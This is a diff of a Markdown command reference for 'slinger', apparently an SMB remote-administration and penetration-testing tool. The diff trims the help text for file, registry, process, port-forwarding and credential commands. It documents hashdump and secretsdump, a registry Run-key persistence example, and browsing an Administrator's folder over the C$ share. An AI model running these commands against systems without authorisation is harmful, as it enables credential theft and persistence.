-  -r           Recurse into directories
-  -p regex     Specify a regex pattern to match filenames
-  -d D         Specify folder depth count for recursion
-
-Example Usage: mget /remote/path /local/path
-
 ```
 
 **Example Usage:**
@@ -2190,18 +1512,8 @@ Example Usage: mget /remote/path /local/path
 
 **Help:**
 ```
-usage: slinger mkdir [-h] path
-
+mkdir [-h] path
 Create a new directory on the remote server
-
-positional arguments:
-  path        Specify the path of the directory to create
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: mkdir /path/to/new/directory
-
 ```
 
 **Example Usage:**
@@ -2222,18 +1534,8 @@ Example Usage: mkdir /path/to/new/directory
 
 **Help:**
 ```
-usage: slinger rmdir [-h] remote_path
-
+rmdir [-h] remote_path
 Remove a directory on the remote server
-
-positional arguments:
-  remote_path  Specify the remote path of the directory to remove
-
-options:
-  -h, --help   show this help message and exit
-
-Example Usage: rmdir /path/to/remote/directory
-
 ```
 
 **Example Usage:**
@@ -2254,18 +1556,8 @@ Example Usage: rmdir /path/to/remote/directory
 
 **Help:**
 ```
-usage: slinger rm [-h] remote_path
-
+rm [-h] remote_path
 Delete a file on the remote server
-
-positional arguments:
-  remote_path  Specify the remote file path to delete
-
-options:
-  -h, --help   show this help message and exit
-
-Example Usage: rm /path/to/remote/file
-
 ```
 
 **Example Usage:**
@@ -2286,15 +1578,8 @@ Example Usage: rm /path/to/remote/file
 
 **Help:**
 ```
-usage: slinger #shell [-h]
-
+#shell [-h]
 Enter local terminal mode for command execution
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: #shell
-
 ```
 
 **Example Usage:**
@@ -2310,18 +1595,8 @@ Example Usage: #shell
 
 **Help:**
 ```
-usage: slinger ! [-h] ...
-
+! [-h] ...
 Run a specified local command
-
-positional arguments:
-  commands    Specify the local commands to run
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: ! ls -l
-
 ```
 
 **Example Usage:**
@@ -2342,15 +1617,8 @@ Example Usage: ! ls -l
 
 **Help:**
 ```
-usage: slinger info [-h]
-
+info [-h]
 Display the status of the current session
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: info
-
 ```
 
 **Example Usage:**
@@ -2366,15 +1634,8 @@ Example Usage: info
 
 **Help:**
 ```
-usage: slinger reguse [-h]
-
+reguse [-h]
 Connect to a remote registry on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: reguse
-
 ```
 
 **Example Usage:**
@@ -2390,15 +1651,8 @@ Example Usage: reguse
 
 **Help:**
 ```
-usage: slinger reguse [-h]
-
+reguse [-h]
 Connect to a remote registry on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: reguse
-
 ```
 
 **Example Usage:**
@@ -2414,15 +1668,8 @@ Example Usage: reguse
 
 **Help:**
 ```
-usage: slinger regstop [-h]
-
+regstop [-h]
 Disconnect from a remote registry on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: regstop
-
 ```
 
 **Example Usage:**
@@ -2438,20 +1685,8 @@ Example Usage: regstop
 
 **Help:**
 ```
-usage: slinger regquery [-h] [-l] [-v] key
-
+regquery [-h] [-l] [-v] key
 Query a registry key on the remote server
-
-positional arguments:
-  key          Specify the registry key to query
-
-options:
-  -h, --help   show this help message and exit
-  -l, --list   List all subkeys in the registry key
-  -v, --value  Enumerate the value of the specified registry key
-
-Example Usage: regquery HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
-
 ```
 
 **Example Usage:**
@@ -2472,20 +1707,8 @@ Example Usage: regquery HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
 
 **Help:**
 ```
-usage: slinger regset [-h] -k KEY -v VALUE -d DATA [-t TYPE]
-
+regset [-h] -k KEY -v VALUE -d DATA [-t TYPE]
 Set a registry value on the remote server
-
-options:
-  -h, --help            show this help message and exit
-  -k KEY, --key KEY     Specify the registry key to set
-  -v VALUE, --value VALUE
-                        Specify the registry value to set
-  -d DATA, --data DATA  Specify the registry data to set
-  -t TYPE, --type TYPE  Specify the registry type to set
-
-Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test -d "C:\test.exe"
-
 ```
 
 **Example Usage:**
@@ -2516,18 +1739,8 @@ Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
 
 **Help:**
 ```
-usage: slinger regdel [-h] -k KEY [-v VALUE]
-
+regdel [-h] -k KEY [-v VALUE]
 Delete a registry value on the remote server
-
-options:
-  -h, --help            show this help message and exit
-  -k KEY, --key KEY     Specify the registry key to delete
-  -v VALUE, --value VALUE
-                        Specify the registry value to delete
-
-Example Usage: regdel -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test
-
 ```
 
 **Example Usage:**
@@ -2551,18 +1764,8 @@ Example Usage: regdel -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
 
 **Help:**
 ```
-usage: slinger regcreate [-h] key
-
+regcreate [-h] key
 Create a registry key on the remote server
-
-positional arguments:
-  key         Specify the registry key to create
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: regcreate -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
-
 ```
 
 **Example Usage:**
@@ -2583,18 +1786,8 @@ Example Usage: regcreate -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\
 
 **Help:**
 ```
-usage: slinger regcheck [-h] key
-
-Check if a registry key exists on the remote server. This is really just an exposed helper function.
-
-positional arguments:
-  key         Specify the registry key to check
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
-
+regcheck [-h] key
+Check if a registry key exists on the remote server.  This is really just an exposed helper function.
 ```
 
 **Example Usage:**
@@ -2615,24 +1808,8 @@ Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\
 
 **Help:**
 ```
-usage: slinger portfwd [-h] (-d | -a | -l | -c | --load) local remote
-
+portfwd [-h] (-d | -a | -l | -c | --load) local remote
 Forward a local port to a remote port on the remote server
-
-positional arguments:
-  local         Specify the local host and port to forward from
-  remote        Specify the remote host and port to forward to
-
-options:
-  -h, --help    show this help message and exit
-  -d, --remove  Remove a port forwarding rule
-  -a, --add     Add a port forwarding rule
-  -l, --list    List all port forwarding rules
-  -c, --clear   Clear all port forwarding rules
-  --load        Load all port forwarding rules from the registry
-
-Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]
-
 ```
 
 **Example Usage:**
@@ -2656,15 +1833,8 @@ Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]
 
 **Help:**
 ```
-usage: slinger ifconfig [-h]
-
+ifconfig [-h]
 Display network interfaces on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: ifconfig
-
 ```
 
 **Example Usage:**
@@ -2680,15 +1850,8 @@ Example Usage: ifconfig
 
 **Help:**
 ```
-usage: slinger ifconfig [-h]
-
+ifconfig [-h]
 Display network interfaces on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: ifconfig
-
 ```
 
 **Example Usage:**
@@ -2704,15 +1867,8 @@ Example Usage: ifconfig
 
 **Help:**
 ```
-usage: slinger ifconfig [-h]
-
+ifconfig [-h]
 Display network interfaces on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: ifconfig
-
 ```
 
 **Example Usage:**
@@ -2728,15 +1884,8 @@ Example Usage: ifconfig
 
 **Help:**
 ```
-usage: slinger hostname [-h]
-
+hostname [-h]
 Display the hostname of the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: hostname
-
 ```
 
 **Example Usage:**
@@ -2752,17 +1901,8 @@ Example Usage: hostname
 
 **Help:**
 ```
-usage: slinger procs [-h] [-v] [-t]
-
+procs [-h] [-v] [-t]
 List running processes on the remote server
-
-options:
-  -h, --help     show this help message and exit
-  -v, --verbose  Display verbose process information
-  -t, --tree     Display process tree
-
-Example Usage: procs -t -v
-
 ```
 
 **Example Usage:**
@@ -2778,17 +1918,8 @@ Example Usage: procs -t -v
 
 **Help:**
 ```
-usage: slinger procs [-h] [-v] [-t]
-
+procs [-h] [-v] [-t]
 List running processes on the remote server
-
-options:
-  -h, --help     show this help message and exit
-  -v, --verbose  Display verbose process information
-  -t, --tree     Display process tree
-
-Example Usage: procs -t -v
-
 ```
 
 **Example Usage:**
@@ -2804,17 +1935,8 @@ Example Usage: procs -t -v
 
 **Help:**
 ```
-usage: slinger procs [-h] [-v] [-t]
-
+procs [-h] [-v] [-t]
 List running processes on the remote server
-
-options:
-  -h, --help     show this help message and exit
-  -v, --verbose  Display verbose process information
-  -t, --tree     Display process tree
-
-Example Usage: procs -t -v
-
 ```
 
 **Example Usage:**
@@ -2830,15 +1952,8 @@ Example Usage: procs -t -v
 
 **Help:**
 ```
-usage: slinger fwrules [-h]
-
+fwrules [-h]
 Display firewall rules on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: fwrules
-
 ```
 
 **Example Usage:**
@@ -2854,19 +1969,8 @@ Example Usage: fwrules
 
 **Help:**
 ```
-usage: slinger set [-h] varname value
-
+set [-h] varname value
 Set a variable for use in the application
-
-positional arguments:
-  varname     Set the debug variable to True or False
-  value       Set the mode variable to True or False
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: set varname value
-
 ```
 
 **Example Usage:**
@@ -2890,15 +1994,8 @@ Example Usage: set varname value
 
 **Help:**
 ```
-usage: slinger config [-h]
-
+config [-h]
 Show the current config
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: config
-
 ```
 
 **Example Usage:**
@@ -2914,23 +2011,13 @@ Example Usage: config
 
 **Help:**
 ```
-usage: slinger run [-h] (-c CMD_CHAIN | -f FILE)
-
+run [-h] (-c CMD_CHAIN | -f FILE)
 Run a slinger script or command sequence
-
-options:
-  -h, --help            show this help message and exit
-  -c CMD_CHAIN, --cmd_chain CMD_CHAIN
-                        Specify a command sequence to run
-  -f FILE, --file FILE  Specify a script file to run
-
-Example Usage: run -c|-f [script]
-
 ```
 
 **Example Usage:**
 ```
-Example Usage: run -c|-f [script]
+Example Usage: run -c "use C$;cd Users;cd Administrator;cd Downloads;ls"
 ```
 
 ### Arguments
@@ -2949,15 +2036,8 @@ Example Usage: run -c|-f [script]
 
 **Help:**
 ```
-usage: slinger hashdump [-h]
-
+hashdump [-h]
 Dump hashes from the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: hashdump
-
 ```
 
 **Example Usage:**
@@ -2973,15 +2053,8 @@ Example Usage: hashdump
 
 **Help:**
 ```
-usage: slinger secretsdump [-h]
-
+secretsdump [-h]
 Dump secrets from the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: secretsdump
-
 ```
 
 **Example Usage:**
@@ -2997,15 +2070,8 @@ Example Usage: secretsdump
 
 **Help:**
 ```
-usage: slinger env [-h]
-
+env [-h]
 Display environment variables on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: env
-
 ```
 
 **Example Usage:**
@@ -3021,20 +2087,8 @@ Example Usage: env
 
 **Help:**
 ```
-usage: slinger debug-availcounters [-h] [-f FILTER] [-p] [-s filename]
-
-Display available performance counters on the remote server. This is for debug use only, it doesn't really give you anything.
-
-options:
-  -h, --help            show this help message and exit
-  -f FILTER, --filter FILTER
-                        Simple filter for case insenstive counters containing a given string
-  -p, --print           Print the available counters to the screen. Must be provide with -s if you want to print to screen.
-  -s filename, --save filename
-                        Save the available counters to a file
-
-Example Usage: availcounters
-
+debug-availcounters [-h] [-f FILTER] [-p] [-s filename]
+Display available performance counters on the remote server.  This is for debug use only, it doesn't really give you anything.
 ```
 
 **Example Usage:**
@@ -3058,20 +2112,8 @@ Example Usage: availcounters
 
 **Help:**
 ```
-usage: slinger debug-counter [-h] [-c COUNTER] [-a {x86,x64,unk}] [-i]
-
-Display a performance counter on the remote server. This is for debug use only, it doesn't really give you anything.
-
-options:
-  -h, --help            show this help message and exit
-  -c COUNTER, --counter COUNTER
-                        Specify the counter to display
-  -a {x86,x64,unk}, --arch {x86,x64,unk}
-                        Specify the architecture of the remote server
-  -i, --interactive     Run the counter in interactive mode
-
-Example Usage: counter -c 123 [-a x86]
-
+debug-counter [-h] [-c COUNTER] [-a {x86,x64,unk}] [-i]
+Display a performance counter on the remote server.  This is for debug use only, it doesn't really give you anything.
 ```
 
 **Example Usage:**
@@ -3097,17 +2139,8 @@ Example Usage: counter -c 123 [-a x86]
 
 **Help:**
 ```
-usage: slinger network [-h] [-tcp] [-rdp]
-
+network [-h] [-tcp] [-rdp]
 Display network information on the remote server
-
-options:
-  -h, --help  show this help message and exit
-  -tcp        Display TCP information
-  -rdp        Display RDP information
-
-Example Usage: network
-
 ```
 
 **Example Usage:**
@@ -3123,15 +2156,8 @@ Example Usage: network
 
 **Help:**
 ```
-usage: slinger reload [-h]
-
+reload [-h]
 Reload the current sessions context
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: reload
-
 ```
 
 **Example Usage:**
@@ -3147,15 +2173,8 @@ Example Usage: reload
 
 **Help:**
 ```
-usage: slinger plugins [-h]
-
+plugins [-h]
 List available plugins
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: plugins
-
 ```
 
 **Example Usage:**
